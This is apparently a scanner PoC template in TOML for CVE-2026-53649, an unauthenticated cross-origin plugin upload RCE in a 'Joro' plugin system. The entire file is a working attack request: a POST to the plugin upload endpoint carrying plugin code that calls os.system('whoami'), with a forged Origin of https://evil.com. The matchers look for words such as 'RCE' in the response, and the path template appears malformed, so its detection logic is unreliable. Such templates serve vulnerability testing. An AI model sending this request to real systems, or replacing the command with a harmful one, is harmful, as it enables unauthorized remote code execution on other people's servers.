[info]
author = "ave"
description = "Joro 插件系统未认证跨域插件上传漏洞，攻击者可通过跨源 HTTP 请求上传恶意插件，触发命令注入实现远程代码执行"
id = "POC-AVE-2026-0426"
name = "CVE-2026-53649 Joro Unauthenticated Cross-Origin Plugin Upload RCE PoC"
severity = "critical"
tags = ["ave-2026-0426"]
vuln_id = [
    "CVE-2026-53649",
    "AVE-2026-0426",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/api/plugins/upload"
protocol = "http"

[poc.requests.body]
content = '{"name":"malicious","source":"plugin","code":"import os; os.system(\"whoami\")"}'
type = "json"

[poc.requests.headers]
Content-Type = "application/json"
Origin = "https://evil.com"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "command-injection",
    "RCE",
    "plugin uploaded",
]
